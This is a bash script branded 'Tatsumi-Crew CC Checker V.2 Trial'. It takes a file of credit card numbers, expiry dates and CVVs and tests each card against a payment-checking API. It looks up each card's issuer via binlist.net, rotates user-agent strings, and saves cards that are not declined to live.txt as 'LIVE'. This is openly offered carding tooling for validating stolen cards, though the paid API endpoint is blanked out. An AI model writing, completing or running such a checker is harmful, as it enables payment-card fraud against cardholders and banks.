
#!/bin/bash
#Tatsumi-Crew & Arvan Apriyana
clear
header(){
waktu=$(date '+%Y-%m-%d %H:%M:%S')
HIJAU='\033[0;32m'
MERAH='\033[0;31m'
NORMAL='\033[0m'
CYAN='\033[0;36m'
BIRU='\033[0;34m'
PUTIH='\033[1;37m'
printf "
${PUTIH}
___________________________________________________________
 ████████╗ █████╗ ████████╗███████╗██╗   ██╗███╗   ███╗██╗
 ╚══██╔══╝██╔══██╗╚══██╔══╝██╔════╝██║   ██║████╗ ████║██║
    ██║   ███████║   ██║   ███████╗██║   ██║██╔████╔██║██║
    ██║   ██╔══██║   ██║   ╚════██║██║   ██║██║╚██╔╝██║██║
    ██║   ██║  ██║   ██║   ███████║╚██████╔╝██║ ╚═╝ ██║██║
    ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝
  
                  CC Checker V.2 Trial 
                  www.tatsumi-crew.net 
          Bug? contact Me : nako48@cyber00t.biz 
           Facebook : https://fb.com/nako48.jp 
___________________________________________________________
"
}
tatsumi(){
    ua=$(cat ua.txt | sort -R | head -1)
    duration=$SECONDS
    SECONDS=0
    curlnya=$(curl -s "CLOSED HAHA" -L)  #API PRICE 400k
    binna=$(curl -s "https://lookup.binlist.net/$1" -L)
    livena=$(echo $curlnya | grep -Po '(?<="code":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
    bincc=$(echo $binna | grep -Po '(?<="name":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
	scheme1=$(echo $binna | grep -Po '(?<="scheme":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
	typena1=$(echo $binna | grep -Po '(?<="type":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
    if [[ ! $livena =~ "card_declined" ]]; then
        printf "\n$1|$2|$3|$4 ${HIJAU}[LIVE] [$bincc/$scheme1-$typena1] [$waktu]\n";
        echo "$1|$2|$3|$4 [LIVE] [$bincc/$scheme1-$typena1] [$waktu]" >> live.txt
        printf "${NORMAL}"
    else
        printf "$1|$2|$3|$4 ${MERAH}[DIE] [$bincc/$scheme1-$typena1] [$waktu]";
        echo ""
        printf "${NORMAL}"
    fi
}
header
echo ""
echo "List In This Directory : "
ls
echo "Delimeter list -> ccnum:bulan:tahun:ccv "
echo -n "Masukan File List : "
read list
if [ ! -f $list ]; then
    echo "$list No Such File"
exit
fi
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    z=$(gawk -F: '{ print $3 }' $list)
    h=$(gawk -F: '{ print $4 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'ccnum=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'exp1=($y)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'exp2=($z)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'ccv=($h)'
for (( i = 0; i < "${#ccnum[@]}"; i++ )); do
    ccnumberna="${ccnum[$i]}"
    bulanna="${exp1[$i]}"
    tahunna="${exp2[$i]}"
    ccvna="${ccv[$i]}"
        tatsumi $ccnumberna $bulanna $tahunna $ccvna
done
